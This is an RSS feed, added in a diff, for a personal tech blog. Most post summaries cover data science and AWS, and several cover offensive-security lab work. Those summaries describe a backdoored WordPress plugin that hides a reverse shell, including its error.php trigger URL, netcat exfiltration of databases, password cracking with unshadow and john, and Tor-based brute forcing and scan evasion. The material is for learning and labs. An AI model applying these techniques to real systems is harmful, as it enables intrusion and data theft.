@@ -1,0 +1,507 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Hi, I&#39;m Kyle</title>
+    <link>https://jovial-yonath-8d9e17.netlify.app/posts/</link>
+    <description>Recent content in Posts on Hi, I&#39;m Kyle</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 13 May 2020 16:52:52 +0000</lastBuildDate>
+    
+	<atom:link href="https://jovial-yonath-8d9e17.netlify.app/posts/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Structured Big Data Analysis</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/structured/</link>
+      <pubDate>Wed, 13 May 2020 16:52:52 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/structured/</guid>
+      <description>I completed the Programming for Data Science with Python nanodegree at Udacity. The program was outstanding. It was formatted in a way that I really like to learn: a short video lesson, a short text recap/expansion of the content, and then a portion to practice what you learned. This course had three main technical objectives and two capstone projects.
+Focus 1: SQL, Beginner to Advanced
+The first objective was to learn SQL.</description>
+    </item>
+    
+    <item>
+      <title>Machine Learning - Transforming Photos into 3D with Python</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2020/05/11/machine-learning-transforming-photos-into-3d-with-python/</link>
+      <pubDate>Mon, 11 May 2020 18:24:46 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2020/05/11/machine-learning-transforming-photos-into-3d-with-python/</guid>
+      <description>I adding depth to an image and created a 3D look from a photo. This is another example of a project that can only be realized due to the amazing era we live - thanks to an amazing open source project on GitHub and the pay-as-you-go pricing on AWS.
+Follow this post to add a 3D look to your own photos. You&amp;rsquo;ll need some familiarity with AWS EC2, AWS CloudWatch, and SSH/SCP to log in to your EC2 instance and move files back and forth.</description>
+    </item>
+    
+    <item>
+      <title>Multiplayer Online Game in Python</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2020/05/07/multiplayer-online-game-in-python/</link>
+      <pubDate>Thu, 07 May 2020 01:11:33 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2020/05/07/multiplayer-online-game-in-python/</guid>
+      <description>Slide 5 or 6 Nimmit! can be played with an actual card deck
+My clone of Slide 5 written in Python
+I almost gave up and quit on this project. I&amp;rsquo;m so glad I stuck with it because the results were so worth it.
+After playing the Slide 5 card game I thought it would be a great game to clone into an online game that can be played with friends over Zoom during the pandemic lock in.</description>
+    </item>
+    
+    <item>
+      <title>Part 2: My Future Self is Beating the Dad-Bod</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2020/04/16/part-2-my-future-self-is-beating-the-dad-bod/</link>
+      <pubDate>Thu, 16 Apr 2020 01:56:24 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2020/04/16/part-2-my-future-self-is-beating-the-dad-bod/</guid>
+      <description>Every day right at 4pm when I should just about be getting hungry for dinner and losing motivation, I get a text message from My Future Self. The text message reminds me of my weight for today and compares it against all of the other 1048 entries I&amp;rsquo;ve logged on my scale the last decade.
+**My Future Self **is smart enough to compare my weight to the previous day to give some encouragement or tough love.</description>
+    </item>
+    
+    <item>
+      <title>According to Facebook, I Will Have a Dad-Bod on June 28, 2021</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2020/04/14/according-to-facebook-i-will-have-a-dad-bod-on-june-28-2021/</link>
+      <pubDate>Tue, 14 Apr 2020 02:25:01 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2020/04/14/according-to-facebook-i-will-have-a-dad-bod-on-june-28-2021/</guid>
+      <description>I stepped on the scale more than 1000 times in the past decade and then used Facebook&amp;rsquo;s predictive modeling framework, Prophet, to see what I will weigh in five years if I don&amp;rsquo;t make changes. At 5&amp;rsquo;9&amp;rdquo; I&amp;rsquo;ll officially have a Dad-Bod when I pass 200 lbs. on June 28, 2021.
+Note: I couldn&amp;rsquo;t help myself from using a click bait headline. The only thing Facebook has to do with this post is I used an amazing open source prediction library they created called Prophet.</description>
+    </item>
+    
+    <item>
+      <title>Building a Model to Pick NCAA First Round Winners</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2020/03/15/building-a-model-to-pick-ncaa-first-round-winners/</link>
+      <pubDate>Sun, 15 Mar 2020 19:29:44 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2020/03/15/building-a-model-to-pick-ncaa-first-round-winners/</guid>
+      <description>Update: I&amp;rsquo;m bummed that the Big Ten and NCAA tournaments were canceled. Subsequently, my trip to Vegas was canceled and therefore, there&amp;rsquo;s really no point in my model - at least for 2020. That said, it&amp;rsquo;s still a great learning opportunity and I finished the work, which is included below. _ The work here can serve as a good starting point for the 2021 tournament_ _where I expect my Illini will be a three seed and at least co-champions of the Big Ten.</description>
+    </item>
+    
+    <item>
+      <title>Using Data Science to Pick NCAA Tournament First Round Winners</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2020/03/07/using-data-science-to-pick-ncaa-tournament-first-round-winners/</link>
+      <pubDate>Sat, 07 Mar 2020 01:42:53 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2020/03/07/using-data-science-to-pick-ncaa-tournament-first-round-winners/</guid>
+      <description>“Usually the team that scores the most points wins the game.” - John Madden
+Update: If you&amp;rsquo;d like to jump right to part 2 of this series you can do so here where I turn the regression analysis into a really basic data science model.
+I&amp;rsquo;m taking the first steps of an 18-24 month journey with a beginner&amp;rsquo;s mindset to establish and grow my data science skills. What better way to begin to learn new skills in March than by applying them to March Madness?</description>
+    </item>
+    
+    <item>
+      <title>Conwell Quotes v1.1</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/05/07/conwell-quotes-v1-1/</link>
+      <pubDate>Tue, 07 May 2019 01:33:19 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/05/07/conwell-quotes-v1-1/</guid>
+      <description>Conwell Quotes is a malicious WordPress plugin that hides a reverse shell in a backdoor behind legitimate plugin functionality. This is used for offensive security purposes.
+This is an update to version 1.1. This update now allows you to pass your ip and port as URL parameters rather than updating the error.php file prior to upload.
+http://example.com/wp-content/plugins/conwell/error.php?ip=XX.XXX.XXX.X&amp;amp;port=XXXX
+You can find the open source code on GitHub.
+Modeled after the Hello Dolly plugin which comes packaged on all new WordPress installations, Conwell Quotes displays a random quote on each page of the WordPress admin portal based on Conwell&amp;rsquo;s Acres of Diamonds (which is one of my favorite books).</description>
+    </item>
+    
+    <item>
+      <title>Hack the Box - Cartographer &#43; Grammar</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/04/28/hack-the-box-cartographer/</link>
+      <pubDate>Sun, 28 Apr 2019 02:27:02 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/04/28/hack-the-box-cartographer/</guid>
+      <description>Hack the Box is a great free resource to play capture the flag by practicing penetration testing on a variety of different labs spanning just about every domain of offensive security. Over the past few months I completed two introductory exercises, HDC and Lernaen.
+This weekend I cleared Cartographer (update: and Grammar - more at the very bottom) and will detail my approach and learnings below. In doing these exercises, so much learning happens figuring out what doesn&amp;rsquo;t work.</description>
+    </item>
+    
+    <item>
+      <title>Thoughts on Increasing Customer Satisfaction</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/04/15/thoughts-on-increasing-customer-satisfaction/</link>
+      <pubDate>Mon, 15 Apr 2019 23:35:39 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/04/15/thoughts-on-increasing-customer-satisfaction/</guid>
+      <description>The Challenge: WordPress.com used to have a finite set of features, all developed by us. We have now introduced the ability for customers to use 55,000+ plugins and themes from the broader WordPress community, and they still expect us to support whatever happens to their site. How should we develop a program to increase customer satisfaction in their interactions with our 350+ support agents?
+ _TLDR; Always,** the customer**. Implement change incrementally.</description>
+    </item>
+    
+    <item>
+      <title>Conwell Quotes - WordPress Plugin With a Backdoor</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/04/14/conwell-quotes-wordpress-plugin-with-a-backdoor/</link>
+      <pubDate>Sun, 14 Apr 2019 19:41:16 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/04/14/conwell-quotes-wordpress-plugin-with-a-backdoor/</guid>
+      <description>Conwell Quotes is a malicious WordPress plugin that hides a reverse shell in a backdoor behind legitimate plugin functionality. This is used for offensive security purposes.
+Here is a direct download of version 1.0 of the plugin that you can add to WordPress.
+You can find the open source code on GitHub.
+Modeled after the Hello Dolly plugin which comes packaged on all new WordPress installation, Conwell Quotes displays a random quote on each page of the WordPress admin portal based on Conwell&amp;rsquo;s Acres of Diamonds (which is one of my favorite books).</description>
+    </item>
+    
+    <item>
+      <title>Information Lifecycle Management (ILM) in AWS with S3 Glacier and Lifecycle Rules</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/03/11/information-lifecycle-management-ilm-in-aws-with-s3-glacier-and-lifecycle-rules/</link>
+      <pubDate>Mon, 11 Mar 2019 16:25:58 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/03/11/information-lifecycle-management-ilm-in-aws-with-s3-glacier-and-lifecycle-rules/</guid>
+      <description>For a few months now I&amp;rsquo;ve been meaning to put an automated rule in place to save money by moving untouched S3 data over to S3 Glacier.
+I previously wrote about how I set my personal blog to backup to AWS the first of every month. It was a fun project, but I began experiencing a micro-chasm of what real businesses experience: the first month my bill was $1, the second month $2, and now by the fourth month, $4.</description>
+    </item>
+    
+    <item>
+      <title>Maintaining Presence and Installing Backdoors</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/02/26/maintaining-presence-and-installing-backdoors/</link>
+      <pubDate>Tue, 26 Feb 2019 20:26:38 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/02/26/maintaining-presence-and-installing-backdoors/</guid>
+      <description>By completing this exercise I learned that the best backdoor is one that you don&amp;rsquo;t need to install yourself! There are two backdoors that I opened up within the Metasploitable 2 operating system (msf2).
+The most powerful and easiest backdoor was to login using the root shell, create a new superuser, and then add this user into the SSH list so that I could make use of the existing SSH server configuration.</description>
+    </item>
+    
+    <item>
+      <title>Exfiltrating Data from MySQL and Postgres</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/02/26/exfiltrating-data-from-mysql-and-postgres/</link>
+      <pubDate>Tue, 26 Feb 2019 02:58:16 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/02/26/exfiltrating-data-from-mysql-and-postgres/</guid>
+      <description>I continued experimenting with Metasploitable 2. Over the past few days I managed to gain access to the MySQL and Postgres databases and used net cat to dump the databases and export them.
+Using a similar technique as before, I used a reverse shell exploit to control the host, I launched mysql, queried the database to view the users, and found that two users didn&amp;rsquo;t have passwords.
+I then used the guest account to dump the tables into a zip file and used net cat to send the file from the host over to my attacker.</description>
+    </item>
+    
+    <item>
+      <title>Got Root? Two More Exploits.</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/02/20/got-root-two-more-exploits/</link>
+      <pubDate>Wed, 20 Feb 2019 17:42:28 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/02/20/got-root-two-more-exploits/</guid>
+      <description>I&amp;rsquo;ve continued my experimentation with the Metasploitable (msf2) operating system as well as the Metasploit framework. I&amp;rsquo;m now up to five, I think, total successful exploits. I will write about two more of them here. The first, most basic, exploit I wrote about previously took advantage of a misconfigured rsh-server.
+My next two exploits followed the same pattern:
+ Conduct an nmap scan to see what services are exposed. 2. Find open ports and search Metasploit for a highly probable exploit or exploit + payload to open a reverse shell with root access  I was successful in exploiting the IRC server running on port 6667 and Java server running on port 5432.</description>
+    </item>
+    
+    <item>
+      <title>My First Metasploitable Vulnerability, Exploit, and Fix</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/02/19/my-first-metasploitable-vulnerability-and-exploit/</link>
+      <pubDate>Tue, 19 Feb 2019 01:01:44 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/02/19/my-first-metasploitable-vulnerability-and-exploit/</guid>
+      <description>In getting started with Metasploitable (msf2), I was looking for a simple first vulnerability and exploit to really try out and get some momentum in my learning.
+A really simple nmap command let me know that a lot of ports were open. There&amp;rsquo;s a great deal of practice I&amp;rsquo;ll be able to put to the test through msf2. I started by noticing the unix login port 513 is open.
+From there, I installed the rsh-client on Kali (sudo apt-get install rsh-client) to see if I could gain remote access using the command rlogin -l root ipaddress.</description>
+    </item>
+    
+    <item>
+      <title>Building a Hacking Lab</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/02/19/building-a-hacking-lab/</link>
+      <pubDate>Tue, 19 Feb 2019 00:32:39 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/02/19/building-a-hacking-lab/</guid>
+      <description>I spent the afternoon yesterday building a local hacking lab. After installing Ubuntu and VirtualBox, I grabbed a copy of Metasploitable (msf2) as well as a copy of Kali. msf2 is a version of Ubuntu that intentionally has a number of security vulnerabilities built in to give you a chance to practice your offensive security techniques.
+One adjustment I had to make was to tweak the VirtualBox settings to bridge the network connection for msf2 and Kali.</description>
+    </item>
+    
+    <item>
+      <title>Graphing Intel with Maltego</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/12/18/graphing-intel-with-maltego/</link>
+      <pubDate>Tue, 18 Dec 2018 21:13:40 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/12/18/graphing-intel-with-maltego/</guid>
+      <description>Maltego is a powerful intelligence gathering utility that allows simple and visual reconnaissance of a host, website, person, and a whole heck of a lot of other topics that can be extended with utilities available in the Transform Hub. I did some straightforward querying on my own infrastructure for technicalagain.com.
+There are other utilities available to pull down some of the same information as Maltego, but none that I have come across that are as powerful outside the terminal and none are nearly so visual.</description>
+    </item>
+    
+    <item>
+      <title>Generating Public/Private Key Pairs</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/12/12/generating-public-private-key-pairs/</link>
+      <pubDate>Wed, 12 Dec 2018 13:53:37 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/12/12/generating-public-private-key-pairs/</guid>
+      <description>My public key is copied at the bottom of this post. I used ecdsa instead of RSA due to the exponentially longer time it would take to brute force&amp;ndash;and at a size of 521 bits that should be practicably impossible. Great write up on the topic here.
+As with elliptic-curve cryptography in general, the bit size of the public key believed to be needed for ECDSA is about twice the size of the security level, in bits.</description>
+    </item>
+    
+    <item>
+      <title>Avoid Detection with Nmap Stealth Scan and Tor</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/12/12/avoid-detection-with-nmap-stealth-scan-and-tor/</link>
+      <pubDate>Wed, 12 Dec 2018 02:06:28 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/12/12/avoid-detection-with-nmap-stealth-scan-and-tor/</guid>
+      <description>The nmap stealth scan -sS flag allows you to search for open ports by adjusting the TCP/IP three way handshake:
+The handshake ordinarily is SYN -&amp;gt; SYN ACK -&amp;gt; ACK
+The -sS flags change the handshake to SYN -&amp;gt; SYN ACK -&amp;gt; RST
+Defined: Synchronize, Acknowledge, Reset
+This makes it less likely, but certainty not impossible for an intrusion detection system to pickup the scan.
+The best approach that I can think of would be to use the -sS flag and between each port tested use Tor to change IPs from within a regionally anticipated region based on the purpose and location of the target.</description>
+    </item>
+    
+    <item>
+      <title>SHA-256 checksums for LogWatcher</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/12/07/sha-256-checksums-for-logwatcher/</link>
+      <pubDate>Fri, 07 Dec 2018 20:14:48 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/12/07/sha-256-checksums-for-logwatcher/</guid>
+      <description>The more I was thinking about it, since LogWatcher is a server utility and may occasionally be run with escalated privileges, I thought it would be wise to publish checksums for integrity.
+LogWatcher is a utility to perform very simple automated system monitoring and alerting. It is an ideal solution to use in conjunction with a web app that has a sound event logging architecture implemented. LogWatcher simply watches an error log file for any anomalous behavior.</description>
+    </item>
+    
+    <item>
+      <title>Credential Stuffing with Cr3dOv3r</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/12/03/credential-stuffing-with-cr3dov3r/</link>
+      <pubDate>Mon, 03 Dec 2018 20:57:24 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/12/03/credential-stuffing-with-cr3dov3r/</guid>
+      <description>After the Dunkin Donuts credential stuffing breach I went on the lookout for a tool to search for and find leaked credentials. I came across Cr3dOv3r, a nice little Python script that let&amp;rsquo;s you search for an email address to see which sites leaked it and when. It also let&amp;rsquo;s you search to find out if a plaintext password was leaked. You can then enter the leaked password, or any password of your choosing, across a broad array of sites and the utility will automatically test to see if it is still valid.</description>
+    </item>
+    
+    <item>
+      <title>Automating System Monitoring and Alerting with LogWatcher.sh</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/11/14/automating-system-monitoring-and-alerting-with-bash/</link>
+      <pubDate>Wed, 14 Nov 2018 02:58:08 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/11/14/automating-system-monitoring-and-alerting-with-bash/</guid>
+      <description>Over the past several weeks I completed this Lynda course about Bash scripting. The course was great and I was able to put my learnings to use. I wrote two handy bash scripts: the first is an open source project on GitHub I created called LogWatcher. The second is still a work in progress, but can be used to scan database exports and system logs to identify if sensitive data is stored in plain text.</description>
+    </item>
+    
+    <item>
+      <title>Moving a backup copy of WordPress over to AWS S3</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/09/28/moving-a-backup-copy-of-wordpress-over-to-aws-s3/</link>
+      <pubDate>Fri, 28 Sep 2018 22:39:13 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/09/28/moving-a-backup-copy-of-wordpress-over-to-aws-s3/</guid>
+      <description>Today I set out to make a complete backup of my WordPress blog, archive of the images and all. I set out to move the backup from my domain host directly into Amazon S3. Eventually, I plan to set a policy within S3 to move the files over to Amazon Glacier for even cheaper storage. We&amp;rsquo;ll start with the AWS portion, then the WordPress portion.
+AWS I created a new user, me, and then I created a new group, with a new policy&amp;ndash;essentially giving myself read, write, and credential creation permissions specifically for S3.</description>
+    </item>
+    
+    <item>
+      <title>Ghost on AWS - success!</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/09/23/ghost-on-aws-success/</link>
+      <pubDate>Sun, 23 Sep 2018 13:56:20 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/09/23/ghost-on-aws-success/</guid>
+      <description>This is the third and final part of my first foray into AWS. You can read part 1 and part 2. AWS is great. Getting access is secure and easy and you can&amp;rsquo;t beat free. AWS is incredibly quick at spinning up new instances and once connected over SSH it is extremely fast - it rivals the feel of a local installation - almost no latency for me.
+After getting Ubuntu installed, I spent the last few evenings attempting to install Ghost per these instructions.</description>
+    </item>
+    
+    <item>
+      <title>More AWS</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/09/20/more-aws/</link>
+      <pubDate>Thu, 20 Sep 2018 01:57:29 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/09/20/more-aws/</guid>
+      <description>Read Part 1 here. After waiting several hours, AWS was ready. I started with a vanilla instance of Ubuntu 16.04. I didn&amp;rsquo;t customize it at all&amp;ndash;mostly because Amazon limits your configuration choices within the free tier, which makes sense to me. It was amazing to see how much power you could really use. For example, if money was no object, you could choose an instance that would support 72 virtual machines with 512 GB of _memory.</description>
+    </item>
+    
+    <item>
+      <title>First Foray Into AWS</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/09/18/first-foray-into-aws/</link>
+      <pubDate>Tue, 18 Sep 2018 01:46:09 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/09/18/first-foray-into-aws/</guid>
+      <description>Tonight I started the journey into Amazon Web Services (AWS) for the first time. First, I signed up for a personal (free!) EC2 instance. My plan is to install the Ghost blogging platform, add a domain name and DNS. Ghost looks pretty cool. Minimal, fast, and will give me a chance to get more familiar with an open source JavaScript architecture I have not used much: Ember.js, Node.js, and Express.js.</description>
+    </item>
+    
+    <item>
+      <title>More Resource Discovery with ForzaBruta.py</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/09/04/more-resource-discovery-with-forzabruta-py/</link>
+      <pubDate>Tue, 04 Sep 2018 18:27:07 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/09/04/more-resource-discovery-with-forzabruta-py/</guid>
+      <description>Been a busy summer, but I spent some time continuing the work I previously wrote about the brute-forcer, ForzaBruta.py. This time working through the Lynda coursework to iterate on the brute-forcer to add convenience and analysis capabilities:
+ * Take screenshots * Capture the MD5 checksum to compare the file contents * Record number of words and characters in each file and the time to load * Filtering and coloring based on return code * Filter for only certain file extensions.</description>
+    </item>
+    
+    <item>
+      <title>Brute Force Resource Discovery with Python and FuzzDB</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/05/21/brute-force-resource-discovery-with-python-and-fuzzdb/</link>
+      <pubDate>Mon, 21 May 2018 01:05:40 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/05/21/brute-force-resource-discovery-with-python-and-fuzzdb/</guid>
+      <description>I have been working through a Python course on Lynda.com and in the course we wrote a brute force resource discovery tool using Python. You put in a URL and then you specify a dictionary word list, and the number of threads to run concurrently. Then the brute forcer, named ForzaBruta.py, works through the word list and gives the page response codes (404, 403, 200, etc.).
+I used the FuzzDB predictable filepaths, file and directory name brute forcer, Raft large directories lowercase dictionary list.</description>
+    </item>
+    
+    <item>
+      <title>Information Gathering with DMitry</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/05/19/information-gathering-with-dmitry/</link>
+      <pubDate>Sat, 19 May 2018 18:39:50 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/05/19/information-gathering-with-dmitry/</guid>
+      <description>DMitry is a nice little utility built into Kali. It&amp;rsquo;s a basic and easy to use utility, but not great. Usage is straight forward.
+dmitry technicalagain.com
+DMitry is worth the effort to simply punch in the command line but don&amp;rsquo;t expect great information back. First, just about everyone is using a whois proxy to conceal their personal information. Second, DMitry relies on search engines to try to find subdomains and email addresses.</description>
+    </item>
+    
+    <item>
+      <title>Brute Force WordPress Passwords with WPScan and Tor</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/05/18/brute-force-wordpress-passwords-with-wpscan-and-tor/</link>
+      <pubDate>Fri, 18 May 2018 00:54:54 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/05/18/brute-force-wordpress-passwords-with-wpscan-and-tor/</guid>
+      <description>Visit [Center City Security](https://centercitysecurity.com?utm_source=TechnicalAgain.com&amp;amp;utm_medium=https://technicalagain.com/2018/05/18/brute-force-wordpress-passwords-with-wpscan-and-tor/&amp;amp;utm_campaign=Technical Again Brute Force Wordpress Passwords with wpscan and tor&amp;amp;utm_content=header) for WordPress Penetration Testing and Security services.
+I took another crack, pun intended, at brute forcing my WordPress password using WPScan. Unlike when I tried it the other day, this time I used Tor and set up a SOCKs proxy to make use of a false IP address. My thinking was that my web host might black list my IP after a certain number of failed attempts, so by using Tor I could simply switch IP addresses once the blacklist went into effect.</description>
+    </item>
+    
+    <item>
+      <title>Writing a Web Crawler with Scrapy</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/05/18/writing-a-web-crawler-with-scrapy/</link>
+      <pubDate>Fri, 18 May 2018 00:06:37 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/05/18/writing-a-web-crawler-with-scrapy/</guid>
+      <description>Scrapy is a Python application framework for crawling web sites and extracting structured data. I challenged myself to see if I could write a web crawler that I could use to crawl this blog and scrape all of the post titles. Here&amp;rsquo;s the code I ended up using.
+` import scrapy
+class BlogSpider(scrapy.Spider): name = &amp;lsquo;blogspider&amp;rsquo; start_urls = [&amp;lsquo;https://technicalagain.com/&#39;]
+def parse(self, response): for title in response.css(&amp;lsquo;h1.title&amp;rsquo;): yield {&amp;lsquo;title&amp;rsquo;: title.css(&amp;lsquo;a ::text&amp;rsquo;).extract_first()}</description>
+    </item>
+    
+    <item>
+      <title>Scan Wordpress for Vulnerabilities with WPScan</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/05/12/scan-wordpress-for-vulnerabilities-with-wpscan/</link>
+      <pubDate>Sat, 12 May 2018 02:23:42 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/05/12/scan-wordpress-for-vulnerabilities-with-wpscan/</guid>
+      <description>I scanned my own Wordpress sites for vulnerabilites using a powerful command-line utility, WPScan. WPScan is a black box vulnerability scanner specifically for WordPress. It is a stark reminder why it is so important to minimize the number of plugins you use, delete the ones you have deactivated, and make sure you are keeping your software up-to-date. One simple little command: sudo wpscan example.com -u will list all the WordPress usernames, plugins installed, whether active or not, as well as all published vulnerabilities for the plugins, whether they have been fixed, as well as how to exploit them.</description>
+    </item>
+    
+    <item>
+      <title>Build an eCommerce Website with WooCommerce</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/05/12/build-an-ecommerce-website/</link>
+      <pubDate>Sat, 12 May 2018 01:11:17 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/05/12/build-an-ecommerce-website/</guid>
+      <description>I spent the last three weeks designing, building, testing, debugging and putting the finishing touches on my first eCommerce website, complete with a full shopping cart experience and product purchase workflow. One of my original project goals in launching this site was to learn how to take a payment online. This turned out to be relatively straight forward.
+I considered three possible approaches for this project: Wordpress with WooCommerce, Bootstrap with a shopping cart add-in, and Shopify.</description>
+    </item>
+    
+    <item>
+      <title>Install Kali Linux on a MacBook</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/04/27/install-kali-linux-on-a-macbook/</link>
+      <pubDate>Fri, 27 Apr 2018 02:01:23 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/04/27/install-kali-linux-on-a-macbook/</guid>
+      <description>I installed Kali Linux on a dualbooted MacBook Pro last week. The frst thing I did was delete unnecessary files on the Mac to free up space and then shrunk the size of the partition using Apple&amp;rsquo;s built-in Disk Utility. I then manually installed Kali on the remaining unused portion of the hard drive.
+This wasn&amp;rsquo;t a particularly challenging project but it wasn&amp;rsquo;t easy either. The only real issue I experienced was related to my bootable USB hard drive.</description>
+    </item>
+    
+    <item>
+      <title>More Password Cracking - Windows Edition with Ophcrack</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/04/22/more-password-cracking-windows-edition-with-ophcrack/</link>
+      <pubDate>Sun, 22 Apr 2018 21:26:37 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/04/22/more-password-cracking-windows-edition-with-ophcrack/</guid>
+      <description>I continued the work I previously explained by attempting to crack a Windows administrator password. This time I created a new windows administrator, booted up using a Kali Linux USB and launched Ophcrack to go after the administrator account I set up.
+After lauching Ophcrack, I navigated to the Windows partition and then \WINDOWS\System32\Config to access the SAM database. I then downloaded a Rainbow Table called Vista Free and after about 10 minutes, the admittedly weak password I setup _hello123 was cracked.</description>
+    </item>
+    
+    <item>
+      <title>Password Cracking with John the Ripper</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/04/17/password-cracking-with-john-the-ripper/</link>
+      <pubDate>Tue, 17 Apr 2018 02:11:59 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/04/17/password-cracking-with-john-the-ripper/</guid>
+      <description>I did some preliminary experimenting with password cracking utility John the Ripper to test the security of my own root password. I started by installing John and dumping the /etc/passwd file.
+sudo apt-get install john
+unshadow /etc/passwd /etc/shadow &amp;gt; mypasswd.txt
+The mypasswd.txt file now holds a salted hash of my root password. I then passed this over to John to work its magic.
+john mypasswd.txt
+John is very powerful. I experimented with the most basic of cracking settings starting with single mode, then word lists and John would have moved to an incremental mode.</description>
+    </item>
+    
+    <item>
+      <title>Setting Up A New Ubuntu Linux Server</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/04/17/setting-up-a-new-ubuntu-linux-server/</link>
+      <pubDate>Tue, 17 Apr 2018 01:40:37 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/04/17/setting-up-a-new-ubuntu-linux-server/</guid>
+      <description>I have plans to start a second open source project that will need a server so over the past few days I re-purposed an old Windows laptop into a server running Ubuntu Linux.
+The installation was a little tricky because after I downloaded the Ubuntu installation file, I discovered that the DVD burner on this old laptop was no longer working. Instead, I needed to create a bootable USB. Rufus is a great utility that made this very fast and easy.</description>
+    </item>
+    
+    <item>
+      <title>The Password Ladder</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/04/11/the-password-ladder/</link>
+      <pubDate>Wed, 11 Apr 2018 01:16:12 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/04/11/the-password-ladder/</guid>
+      <description>Where are you on the Password Ladder and what can you do to move one rung higher?
